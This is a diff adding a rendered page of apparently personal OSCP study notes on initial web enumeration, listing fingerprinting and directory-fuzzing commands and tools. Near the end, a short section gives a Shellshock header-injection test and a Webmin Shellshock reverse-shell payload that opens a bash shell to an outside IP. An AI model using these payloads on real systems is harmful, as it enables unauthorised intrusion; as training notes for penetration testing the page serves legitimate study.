@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+
+		<!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>initial methodology | OSCP Notes</title>
+<meta name="generator" content="Jekyll v3.8.7" />
+<meta property="og:title" content="initial methodology" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="1. fingerprinting 2. fuzzing 3. html analyzis 4. check what webserver? what backend? what methods can use? any link or hints in html source? any admin panel? default credentials? hostname change anything?" />
+<meta property="og:description" content="1. fingerprinting 2. fuzzing 3. html analyzis 4. check what webserver? what backend? what methods can use? any link or hints in html source? any admin panel? default credentials? hostname change anything?" />
+<link rel="canonical" href="http://localhost:4000/2-web/0-initial-enumeration/" />
+<meta property="og:url" content="http://localhost:4000/2-web/0-initial-enumeration/" />
+<meta property="og:site_name" content="OSCP Notes" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-08-03T20:23:57+00:00" />
+<script type="application/ld+json">
+{"@type":"Article","url":"http://localhost:4000/2-web/0-initial-enumeration/","headline":"initial methodology","dateModified":"2020-08-03T20:23:57+00:00","datePublished":"2020-08-03T20:23:57+00:00","description":"1. fingerprinting 2. fuzzing 3. html analyzis 4. check what webserver? what backend? what methods can use? any link or hints in html source? any admin panel? default credentials? hostname change anything?","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/siteicon.png"}},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+		<link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="OSCP Notes" />
+
+		<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Merriweather:400,400italic,700,700italic|Open+Sans:400,400italic,600,600italic,700,700italic|Inconsolata:400,700">
+		<link rel="stylesheet" href="/css/main.css">
+		<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+		<link rel="icon" type="image/png" href="/touch-icon.png" sizes="192x192">
+		<link rel="icon" type="image/png" href="/images/favicon.png">
+
+		
+	</head>
+
+	<body>
+		<header>
+			<h1>
+				<a href="/"><img src="/images/emblem.svg" width="40" height="40" alt="OSCP Notes logo"></a>
+				OSCP Notes
+				<button type="button" class="open-nav" id="open-nav"></button>
+			</h1>
+
+			<form action="/search/" method="get">
+				<input type="text" name="q" id="search-input" placeholder="Search" autofocus>
+				<input type="submit" value="Search" style="display: none;">
+			</form>
+
+			<nav class="full-navigation">
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/">Hack The Planet</a>
+					</li>
+				</ul>
+
+				<ul>
+					
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/0-basics/1-network-basics/">basics</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/0-basics/1-network-basics/">network basics</a></li>
+								
+									<li class="nav-item "><a href="/0-basics/2-metasploit-basics/">metasploit basics</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/1-recon-enum/1-0-passive-recon/">enum</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/1-recon-enum/1-0-passive-recon/">passive recon</a></li>
+								
+									<li class="nav-item "><a href="/1-recon-enum/1-1-port-scanning-server-side-enumeration/">PORT SCANNING</a></li>
+								
+									<li class="nav-item "><a href="/1-recon-enum/1-3-common-ports/">COMMON PORTS</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level current">
+							
+							<a href="/2-web/0-initial-enumeration/">web</a>
+							<ul>
+								
+									<li class="nav-item current"><a href="/2-web/0-initial-enumeration/">initial methodology</a></li>
+								
+									<li class="nav-item "><a href="/2-web/LFI-RFI/">Local and Remote file inclusion</a></li>
+								
+									<li class="nav-item "><a href="/2-web/cms/">CMSs</a></li>
+								
+									<li class="nav-item "><a href="/2-web/command-injection/">command injection</a></li>
+								
+									<li class="nav-item "><a href="/2-web/csrf/">CSRF</a></li>
+								
+									<li class="nav-item "><a href="/2-web/sqli/">SQL Injections</a></li>
+								
+									<li class="nav-item "><a href="/2-web/ssl/">ssl</a></li>
+								
+									<li class="nav-item "><a href="/2-web/ssrf/">ssrf</a></li>
+								
+									<li class="nav-item "><a href="/2-web/upload-bypass/">upload-bypass</a></li>
+								
+									<li class="nav-item "><a href="/2-web/verb-tampering/">verb tampering</a></li>
+								
+									<li class="nav-item "><a href="/2-web/xee/">XXE</a></li>
+								
+									<li class="nav-item "><a href="/2-web/xss/">XSS</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/3-Exploiting/1-webshells/">exploiting</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/3-Exploiting/1-webshells/">webshells</a></li>
+								
+									<li class="nav-item "><a href="/3-Exploiting/2-shellcodes-compiling-deploying/">shellcodes , compiling and deploying</a></li>
+								
+									<li class="nav-item "><a href="/3-Exploiting/3-bypassing-AV/">bypassing AV</a></li>
+								
+									<li class="nav-item "><a href="/3-Exploiting/4-databases/">databases</a></li>
+								
+									<li class="nav-item "><a href="/3-Exploiting/6-reverse-shells/">Reverse Shells</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/4-win-privesc/1-initial/">win privesc</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/4-win-privesc/1-initial/">initial</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/10-always-install-elevated/">always install elevated</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/11-secondary-logon-ms16-032/">secondary logon handle</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/12-insecure-registry/">insecure registry permissions</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/13-intel-sysret/">intel sysret</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/14-runas/">runas</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/15-LFI-FILES/">LFI files</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/16-UAC/">UAC bypass</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/17-llmnr/">LLMNR and NBT-NS poisoning</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/2-stored-credentials/">stored credentials</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/3-kernel/">Kernel Vulns</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/4-dll-injection/">DLL Injection</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/5-weak-service-permissions/">weak services</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/6-dll-hijacking/">DLL hijacking</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/7-potato/">POTATOS</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/8-group-policies-preferences/">group policy preferences</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/9-unquoted-service-path/">unquoted service path</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/5-linux-privesc/4-2-linux-privesc/">linux privesc</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/5-linux-privesc/4-2-linux-privesc/">linux privesc</a></li>
+								
+									<li class="nav-item "><a href="/5-linux-privesc/lin-security/">lin-security + GTFO bins</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/6-post-exploitation/4-0-windows-file-transfer/">post exploitation</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/6-post-exploitation/4-0-windows-file-transfer/">windows file transfer</a></li>
+								
+									<li class="nav-item "><a href="/6-post-exploitation/4-3-passwords+hash_attacks/">passwords attacks</a></li>
+								
+									<li class="nav-item "><a href="/6-post-exploitation/4.4-pivoting+tunneling/">pivoting+tunneling</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/7-varios/tips/">varios</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/7-varios/tips/">tips</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/8-cheatsheets/msfvenom/">cheatsheets</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/8-cheatsheets/msfvenom/">msfvenom</a></li>
+								
+									<li class="nav-item "><a href="/8-cheatsheets/nmap/">nmap</a></li>
+								
+									<li class="nav-item "><a href="/8-cheatsheets/powershell/">powershell</a></li>
+								
+									<li class="nav-item "><a href="/8-cheatsheets/tmux/">tmux</a></li>
+								
+							</ul>
+						</li>
+					
+				</ul>
+
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/changelog/"></a>
+					</li>
+				</ul>
+			</nav>
+		</header>
+
+		<section class="main">
+			<div class="page-header">
+				<h2>web</h2>
+				<h3>initial methodology</h3>
+			</div>
+			<article class="content">
+				<h2 id="1-fingerprinting">1. fingerprinting</h2>
+<h2 id="2-fuzzing">2. fuzzing</h2>
+<h2 id="3-html-analyzis">3. html analyzis</h2>
+<h2 id="4-check">4. check</h2>
+<ul>
+  <li>what webserver?</li>
+  <li>what backend?</li>
+  <li>what methods can use?</li>
+  <li>any link or hints in html source?</li>
+  <li>any admin panel?</li>
+  <li>default credentials?</li>
+  <li>hostname change anything?</li>
+</ul>
+
+<h1 id="1-finerprinting">1 Finerprinting</h1>
+<hr />
+<h2 id="nikto">nikto</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nikto -C all -h http://IP
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nikto -h $host  -p $puerto
+</code></pre></div></div>
+
+<h2 id="httprint">httprint</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  httprint -h www1.example.com -s signatures.txt
+</code></pre></div></div>
+
+<h2 id="whatweb">whatweb</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb http://nop.sh
+</code></pre></div></div>
+
+<h2 id="wafw00f">WAFW00F</h2>
+
+<p>allows one to identify and fingerprint Web Application Firewall (WAF) products protecting a website.</p>
+
+<p>https://github.com/EnableSecurity/wafw00f</p>
+
+<h2 id="banner-grabbing-with-nc">banner grabbing with nc</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  nc 192.168.0.10 80
+  GET / HTTP/1.1
+  Host: 192.168.0.10
+  User-Agent: Mozilla/4.0
+  Referrer: www.example.com
+  &lt;enter&gt;
+  &lt;enter&gt;
+</code></pre></div></div>
+
+<h1 id="2-fuzzing-1">2. Fuzzing</h1>
+<hr />
+<h2 id="dirb">DirB</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dirb http://IP:PORT /usr/share/dirb/wordlists/common.txt
+</code></pre></div></div>
+<h2 id="ffuf">ffuf</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf -u http://10.10.10.171/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,204,301,302,307,401 -o results.txt
+</code></pre></div></div>
+<h2 id="gobuster">GoBuster</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> gobuster dir -f -r -k   --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  -u http://10.10.10.56:80
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster dir -f -r -k   --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x .php,.html -u http://10.10.10.56:80/cgi-bin/
+</code></pre></div></div>
+
+<h2 id="wfuzz">wfuzz</h2>
+<ul>
+  <li>fuzz - /usr/share/wfuzz/wordlist/</li>
+</ul>
+
+<h2 id="lists">Lists</h2>
+<ul>
+  <li>SecList - /usr/share/seclists/</li>
+  <li>DirB - /usr/share/dirb/wordlists/</li>
+  <li>fuzz - /usr/share/wfuzz/wordlist/</li>
+</ul>
+
+<h1 id="3-html-analysis">3. html analysis</h1>
+<hr />
+
+<h2 id="linkfinder">linkfinder</h2>
+<p>busca links en .js files</p>
+
+<h2 id="html2text">html2text</h2>
+<p>html -&gt; texto leible</p>
+
+<h2 id="cewl">cewl</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cewl http://192.168.168.168/index.html -m 2 -w cewl.lst
+</code></pre></div></div>
+
+<h1 id="varios">VARIOS</h1>
+<hr />
+
+<h2 id="shellshock">shellshock</h2>
+
+<p>vuln en apache con mod_cgi, le apendeas gilada a bash
+podes tener en otras cosas que no sean apache tipo webmin</p>
+
+<h3 id="apache">Apache</h3>
+<ol>
+  <li>encontrar /cgi-bin/</li>
+  <li>encontrar el archivo ahi</li>
+  <li>curl -H “X-Frame-Options: () { :;};echo;echo gato” 10.10.10.56/cgi-bin/user.sh
+<strong>webmin reverse shellshock shell</strong>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User-Agent: () {:;}; bash  -i &gt;&amp; /dev/tcp/10.10.15.1/1337 0&gt;&amp;1
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h2 id="heartbleed">Heartbleed</h2>
+<p>TODO</p>
+
+<h2 id="download-web-with-httrack">download web with httrack</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>httrack partidopirata.com.ar
+</code></pre></div></div>
+
+<h2 id="webdav">WEBDAV</h2>
+
+<p><strong>davtest</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  davtest –url http://(target IP) – will display what is executable
+</code></pre></div></div>
+<p><strong>cadaver</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  cadaver http://(target IP), then run “ls” to list directories found
+</code></pre></div></div>
+
+			</article>
+		</section>
+
+		<script>
+			document.getElementById("open-nav").addEventListener("click", function () {
+				document.body.classList.toggle("nav-open");
+			});
+		</script>
+	</body>
+</html>
